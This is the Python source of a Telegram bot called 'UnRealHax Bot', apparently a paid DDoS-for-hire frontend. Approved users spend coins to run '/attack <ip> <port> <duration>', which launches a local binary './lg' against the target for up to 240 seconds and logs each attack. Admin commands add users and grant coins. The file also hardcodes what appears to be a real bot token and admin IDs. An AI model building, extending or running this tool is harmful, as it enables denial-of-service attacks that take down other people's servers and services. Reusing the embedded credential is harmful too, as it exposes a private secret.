import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime
import subprocess

# Configuration
TELEGRAM_BOT_TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your bot token
ADMIN_USER_IDS = [7163028849, 1234567890]  # List of admin user IDs  # Replace with the admin user ID
ALLOWED_GROUP_ID = -1002298552334  # Replace with your Telegram group ID
USERS_FILE = 'users.txt'
WALLET_FILE = 'wallets.txt'
COINS_FILE = 'coins.txt'
HISTORY_FILE = 'history.txt'
attack_in_progress = False

# Load and save functions
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

def load_wallets():
    try:
        with open(WALLET_FILE) as f:
            return {line.split()[0]: int(line.split()[1]) for line in f}
    except FileNotFoundError:
        return {}

def save_wallets(wallets):
    with open(WALLET_FILE, 'w') as f:
        f.writelines(f"{user} {coins}\n" for user, coins in wallets.items())


def load_coins():
    try:
        with open(COINS_FILE, 'r') as f:
            return {line.split()[0]: int(line.split()[1]) for line in f}
    except FileNotFoundError:
        return {}

def save_coins(coins):
    with open(COINS_FILE, 'w') as f:
        f.writelines(f"{user} {amount}\n" for user, amount in coins.items())

def log_attack(user_id, ip, port, duration, coins_deducted):
    with open(HISTORY_FILE, 'a') as f:
        f.write(f"{user_id} | {ip}:{port} | {duration}s | {coins_deducted} coins | {datetime.now()}\n")

# Globals
users = load_users()
coins = load_coins()
wallets = load_wallets()  # Initialize an empty dictionary


def is_group_chat(update: Update) -> bool:
    chat_id = update.effective_chat.id
    return chat_id == ALLOWED_GROUP_ID  # Replace with your group's ID


# Handlers
async def start(update: Update, context: CallbackContext):
    if not is_group_chat(update):
        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
        return

    message = (
        "🔥 Welcome to the UnRealHax Bot 🔥\n\n"
        "Commands:\n"
        "/attack <ip> <port> <duration> - Launch an attack\n"
        "/account - Check your coins\n"
        "/logs - View your attack logs\n"
    )
    await update.message.reply_text(message)


async def manage(update: Update, context: CallbackContext):
    if update.effective_chat.id != ALLOWED_GROUP_ID:
        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
        return

    if update.effective_user.id not in ADMIN_USER_IDS:  # Updated to allow multiple admins
        await update.message.reply_text("⚠️ You need admin privileges to use this command.")
        return

    args = context.args
    if len(args) != 2:
        await update.message.reply_text("⚠️ Usage: /manage <add|rem> <user_id>")
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        if target_user_id not in coins:
            coins[target_user_id] = 2000  # Add 2000 free coins for new users
            save_coins(coins)
        await update.message.reply_text(f"✔️ User {target_user_id} added with 2000 bonus coins.")
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await update.message.reply_text(f"✔️ User {target_user_id} removed.")
    else:
        await update.message.reply_text("⚠️ Invalid command. Use add or rem.")


async def add_coin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ALLOWED_GROUP_ID:
        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
        return

    if update.effective_user.id not in ADMIN_USER_IDS:
        await update.message.reply_text("⚠️ You need admin privileges to use this command.")
        return

    if len(args) != 2:
        await update.message.reply_text("⚠️ Usage: /addcoin <user_id> <amount>")
        return

    user_id, amount = args
    try:
        amount = int(amount)
    except ValueError:
        await update.message.reply_text("⚠️ Amount must be an integer.")
        return

    coins[user_id] = coins.get(user_id, 0) + amount
    save_coins(coins)
    await update.message.reply_text(f"✔️ Added {amount} coins to user {user_id}.")

async def my_account(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if chat_id != ALLOWED_GROUP_ID:
        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
        return

    user_coins = coins.get(user_id, 0)
    await update.message.reply_text(f"💰 Your Coins: {user_coins}")

async def history(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if chat_id != ALLOWED_GROUP_ID:
        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
        return

    try:
        with open(HISTORY_FILE, 'r') as f:
            logs = [line for line in f if line.startswith(user_id)]
        if logs:
            log_text = "\n".join(logs)
            await update.message.reply_text(f"📜 Your Attack Logs:\n{log_text}")
        else:
            await update.message.reply_text("⚠️ No logs found.")
    except FileNotFoundError:
        await update.message.reply_text("⚠️ No logs found.")

async def attack(update: Update, context: CallbackContext):
    if not is_group_chat(update):
        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
        return

    # Existing logic for attack command

    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await update.message.reply_text("⚠️ You need approval to use this bot.")
        return

    if attack_in_progress:
        await update.message.reply_text("⚠️ Another attack is in progress. Please wait for it to finish.")
        return

    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = args
    try:
        duration = int(duration)
    except ValueError:
        await update.message.reply_text("⚠️ Duration must be an integer.")
        return
    
    if duration > 240:
        await update.message.reply_text("⚠️ Maximum attack duration is 240 seconds.")
        return


    user_coins = coins.get(user_id, 0)
    if user_coins < duration:
        await update.message.reply_text("⚠️ Insufficient coins.")
        return

    # Deduct coins and start the attack
    coins[user_id] = user_coins - duration
    save_coins(coins)
    attack_in_progress = True

    await update.message.reply_text(f"⚔️ Attack launched on {ip}:{port} for {duration} seconds. Please wait until it completes.")

    # Offload the attack to a background task
    context.application.create_task(run_attack(ip, port, duration, update, context))

async def run_attack(ip: str, port: str, duration: int, update: Update, context: CallbackContext):
    global attack_in_progress
    try:
        # Run the binary file
        process = subprocess.Popen(
            [f"./lg", ip, port, str(duration), "900"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Wait for the process to complete asynchronously
        while process.poll() is None:
            await asyncio.sleep(1)

        # Capture output and errors
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"✅ Attack completed successfully!"
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"⚠️ Attack failed! Error: {stderr.decode().strip()}"
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ An error occurred: {str(e)}"
        )
    finally:
        attack_in_progress = False

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("addcoin", add_coin))
    application.add_handler(CommandHandler("account", my_account))
    application.add_handler(CommandHandler("logs", history))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == "__main__":
    main()
